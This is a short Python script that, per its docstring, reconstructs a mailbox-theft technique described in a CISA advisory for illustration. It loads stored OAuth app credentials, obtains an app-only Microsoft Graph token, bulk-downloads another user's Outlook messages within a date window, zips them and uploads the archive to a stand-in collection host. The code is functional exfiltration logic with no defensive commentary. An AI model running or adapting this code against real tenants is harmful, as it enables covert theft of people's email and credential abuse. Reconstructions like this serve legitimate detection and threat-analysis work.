"""Representative reconstruction of the office-cli pattern from CISA AA26-281A:
OAuth daemon credentials from a JSON config drive bulk pulls of another
user's Outlook mailbox across date windows, with each batch zipped and
uploaded. Representative synthesis, not recovered malware."""

import json
import zipfile

import msal
import requests

ENDPOINT = "https://graph.microsoft.com/v1.0/users/backup@example.com/messages"


def harvest(config_path, out_dir, start, end):
    with open(config_path) as handle:
        account = json.load(handle)
    client_id = account["client_id"]
    tenant_id = account["tenant_id"]
    secret = account["secret"]
    app = msal.ConfidentialClientApplication(
        client_id,
        authority="https://login.microsoftonline.com/" + tenant_id,
        client_credential=secret,
    )
    token = app.acquire_token_for_client(
        scopes=["https://graph.microsoft.com/.default"]
    )
    auth = {"Authorization": "Bearer " + token["access_token"]}
    query = {
        "grant_type": "client_credentials",
        "$filter": "receivedDateTime ge " + start + " and receivedDateTime lt " + end,
    }
    url = "https://graph.microsoft.com/v1.0/users/" + account["login"] + "/messages"
    seen = []
    while url:
        page = requests.get(url, headers=auth, params=query).json()
        seen.extend(page.get("value", []))
        url = page.get("@odata.nextLink")
        query = None
    bundle_path = out_dir + "/batch.zip"
    with zipfile.ZipFile(bundle_path, "w") as bundle:
        bundle.writestr("batch.json", json.dumps(seen))
    with open(bundle_path, "rb") as handle:
        requests.post("https://collection.example/store", data=handle.read())
